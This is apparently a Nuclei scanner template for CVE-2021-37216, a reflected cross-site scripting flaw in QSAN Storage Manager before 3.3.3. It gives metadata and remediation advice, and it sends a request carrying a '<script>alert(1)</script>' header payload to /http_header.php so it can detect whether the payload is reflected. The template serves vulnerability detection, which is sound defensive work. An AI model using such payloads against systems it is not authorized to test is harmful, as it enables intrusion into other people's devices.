id: CVE-2021-37216

info:
  name: QSAN Storage Manager <3.3.3 - Cross-Site Scripting
  author: dwisiswant0
  severity: medium
  description: |
    QSAN Storage Manager before 3.3.3 contains a reflected cross-site scripting vulnerability.  Header page parameters do not filter special characters. Remote attackers can inject JavaScript to access and modify specific data.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade QSAN Storage Manager to version 3.3.3 or later to mitigate this vulnerability.
  reference:
    - https://www.twcert.org.tw/tw/cp-132-4962-44cd2-1.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-37216
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-37216
    cwe-id: CWE-79
    epss-score: 0.0404
    epss-percentile: 0.8805
    cpe: cpe:2.3:o:qsan:xn8024r_firmware:3.1.5:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: qsan
    product: xn8024r_firmware
  tags: cve,cve2021,xss,qsan,storage

http:
  - method: GET
    path:
      - "{{BaseURL}}/http_header.php"

    headers:
      X-Trigger-XSS: "<script>alert(1)</script>"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "!contains(tolower(header), 'x-xss-protection')"

      - type: word
        part: body
        words:
          - '"HTTP_X_TRIGGER_XSS":"<script>alert(1)</script>"'

      - type: word
        part: header
        words:
          - "text/html"
# digest: 490a00463044021f1e0b7b12f2f478898fe136b427c505df71dee1ac4e070d31f816bfadbc537c022100d3e2c313d586a4be87f1b7cb7d35e73f6471c0cc0fe6a63596eb57b5569581ad:922c64590222798bb761d5b6d8e72950